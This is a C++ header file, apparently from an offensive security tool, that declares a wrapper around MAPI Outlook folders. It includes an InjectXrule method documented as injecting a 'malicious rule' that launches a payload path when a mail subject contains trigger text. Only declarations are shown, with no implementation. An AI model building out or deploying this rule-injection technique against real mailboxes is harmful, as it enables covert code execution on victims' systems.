#pragma once

namespace MapiTools
{
	/// Useful wrapper for IMsgStore structure.
	struct MapiFolder : public CppTools::PointerObject<MapiFolder, IMAPIFolder>
	{
		/// Default move constructor.
		MapiFolder(MapiFolder&&) = default;

		/// Destructor.
		~MapiFolder() { Close(); }

		/// Closes the MAPI folder.
		void Close() { if (!m_Pointer) return; m_Pointer->Release(); m_Pointer = nullptr; }

		/// Opens table of rules.
		/// @return ExchangeModifyTable object.
		MapiTools::ExchangeModifyTable OpenRulesTable() const;

		/// Injects malicious rule.
		/// @param ruleName this name will be seen on Outlook's rule list. Has to be shorter than 256 characters.
		/// @param triggerText text in mail subject that triggers payload launching. Has to be shorter than 256 characters.
		/// @param payloadPath path to payload. Has to be shorter than 256 characters.
		void InjectXrule(const std::wstring& ruleName, const std::wstring& triggerText, const std::wstring& payloadPath) const;

	protected:
		/// Protected ctor.
		/// @param folder API pointer to folder.
		MapiFolder(LPMAPIFOLDER folder) : PointerObject(folder) { ValidateParam(folder); }

		/// Friendships.
		friend struct MessageStore;
	};
}
